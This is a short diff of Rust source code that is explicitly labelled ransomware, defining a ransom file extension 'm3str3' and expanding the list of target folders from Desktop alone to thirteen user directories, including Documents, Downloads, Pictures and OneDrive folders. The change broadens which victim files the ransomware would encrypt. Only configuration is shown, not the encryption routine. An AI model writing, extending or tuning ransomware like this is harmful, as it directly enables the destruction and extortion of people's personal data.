@@ -6,20 +6,20 @@
 static RANSOM_EXT: &str = "m3str3";
 
 // ======================= RANSOMWARE  ======================
-static DIR_NAMES: [&str; 1] = [
-    //"Contacts",
+static DIR_NAMES: [&str; 13] = [
+    "Contacts",
     "Desktop",
-    //"Documents",
-    //"Downloads",
-    //"Favorites",
-    //"Music",
-    //"OneDrive\\Attachments",
-    //"OneDrive\\Desktop",
-    //"OneDrive\\Documents",
-    //"OneDrive\\Pictures",
-    //"OneDrive\\Music",
-    //"Pictures",
-    //"Videos",
+    "Documents",
+    "Downloads",
+    "Favorites",
+    "Music",
+    "OneDrive\\Attachments",
+    "OneDrive\\Desktop",
+    "OneDrive\\Documents",
+    "OneDrive\\Pictures",
+    "OneDrive\\Music",
+    "Pictures",
+    "Videos",
 ];
 
 // ======================= EXTENSIONS TO ENCRYPT ======================
